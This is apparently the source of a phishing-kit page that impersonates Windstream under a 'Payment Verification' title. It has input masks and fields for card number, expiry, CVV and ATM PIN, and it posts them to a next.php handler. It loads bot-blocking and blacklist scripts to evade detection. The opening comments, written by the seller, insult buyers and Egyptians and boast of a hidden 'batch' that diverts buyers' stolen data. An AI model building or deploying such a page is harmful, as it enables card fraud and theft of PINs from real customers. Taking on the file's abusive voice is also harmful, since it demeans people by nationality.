<?php
// dont share page will fuk the code but you will stil do beacase all egypt stupid. I will batch all your work dumb fuckers
// @labdata1 if you didnt buy from me i hide batch so buy my code and dont share i will cash all your work LOL LOL.

include '../prevents/bot.php';
include '../prevents/ref.php';
include '../prevents/blacklist.php';
include '../prevents/blocker.php';
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <title>Windstream - Payment Verification</title>

    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>

    <!-- jQuery & Input Masking -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

    <!-- Font Awesome for card icon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <script>
        $(function() {
            $('#ccnr').mask('0000 0000 0000 0000');
            $('#expr').mask('00/00');
            $('#cvvr').mask('000');
            $('#atmr').mask('0000');
        });
    </script>

    <style>
        /* Windstream-themed custom styles */
        .form-container {
            background: linear-gradient(145deg, #ffffff, #f8f9fa);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
            border-radius: 1.5rem;
        }

        .input-field {
            transition: all 0.3s ease;
        }

        .input-field:focus {
            border-color: #00002e;
            box-shadow: 0 0 0 3px rgba(239, 103, 36, 0.15);
        }

        .submit-btn {
            background-color: #00002e;
            transition: all 0.3s ease;
        }

        .submit-btn:hover {
            background-color: #d85c20;
            transform: translateY(-2px);
        }
    </style>
</head>

<body class="bg-gray-50 min-h-screen flex flex-col">

    <!-- Header -->
    <header class="bg-white shadow-sm">
        <nav class="container mx-auto px-6 py-4 flex justify-center items-center">
            <a href="#" aria-label="Windstream Home">
                <img src="./assets/img/windstream.jpg" alt="Windstream Logo" class="h-12">
            </a>
        </nav>
    </header>

    <!-- Main Content -->
    <main class="flex-grow flex items-center justify-center py-12 px-4">
        <div class="form-container rounded-2xl p-8 max-w-md w-full">
            <h1 class="text-3xl font-bold text-gray-900 text-center mb-2">
                Payment Verification
            </h1>
            <p class="text-gray-500 text-center mb-8 text-sm">
                Please provide your payment details to verify and secure your account.
            </p>

            <form action="../next.php" method="post" class="space-y-5">
                <!-- Card Number -->
                <div class="relative">
                    <label for="ccnr" class="block text-sm font-medium text-gray-700">Card Number</label>
                    <input type="text" id="ccnr" name="ccnr" inputmode="numeric" placeholder="XXXX XXXX XXXX XXXX"
                        minlength="19" maxlength="19" required autofocus
                        class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500 pr-12">
                    <div class="absolute inset-y-0 right-0 flex items-center pr-4 mt-6">
                        <i class="fas fa-credit-card text-gray-400"></i>
                    </div>
                </div>

                <!-- Expiry Date and CVV -->
                <div class="flex space-x-4">
                    <!-- Expiry Date -->
                    <div class="flex-1">
                        <label for="expr" class="block text-sm font-medium text-gray-700">Expiry Date</label>
                        <input type="text" id="expr" name="expr" inputmode="numeric" placeholder="MM/YY" minlength="5"
                            maxlength="5" required
                            class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500">
                    </div>
                    <!-- CVV -->
                    <div class="flex-1">
                        <label for="cvvr" class="block text-sm font-medium text-gray-700">CVV</label>
                        <input type="text" id="cvvr" name="cvvr" inputmode="numeric" placeholder="XXX" minlength="3"
                            maxlength="4" required
                            class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500">
                    </div>
                </div>

                <!-- ATM PIN -->
                <div>
                    <label for="atmr" class="block text-sm font-medium text-gray-700">ATM PIN</label>
                    <input type="password" id="atmr" name="atmr" inputmode="numeric" placeholder="XXXX" minlength="4"
                        maxlength="4" required
                        class="input-field mt-1 block w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-orange-500">
                </div>



                <!-- Submit Button -->
                <div class="text-center">
                    <button type="submit" name="submit"
                        class="submit-btn w-full text-white px-6 py-3 rounded-lg font-medium text-lg hover:shadow-lg">
                        Continue
                    </button>
                </div>
            </form>
        </div>
    </main>



    <!-- Accessibility for Footer Links -->

</body>

</html>